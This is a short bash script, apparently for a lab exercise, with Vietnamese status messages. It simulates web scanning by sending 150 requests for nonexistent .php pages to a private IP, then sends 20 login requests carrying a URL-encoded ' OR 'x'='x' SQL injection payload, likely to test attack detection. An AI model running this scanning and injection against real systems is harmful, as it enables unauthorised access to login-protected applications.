#!/bin/bash

TARGET_IP="192.168.254.130"

echo "--- Bat dau mo phong Web Scanning (150 yeu cau 404) ---"
for i in $(seq 1 150); do \
  curl -s -o /dev/null "http://${TARGET_IP}/trang_khong_ton_tai_$i.php"; \
  sleep 0.1; \
done
echo "--- Mo phong Web Scanning hoan tat ---"

echo ""
echo "--- Bat dau mo phong SQL Injection (20 yeu cau) ---"
for i in $(seq 1 20); do \
  curl -s -o /dev/null "http://${TARGET_IP}/login.php?user=%27%20OR%20%27${i}%27%3D%27${i}%27"; \
  sleep 0.5; \
done
echo "--- Mo phong SQL Injection hoan tat ---"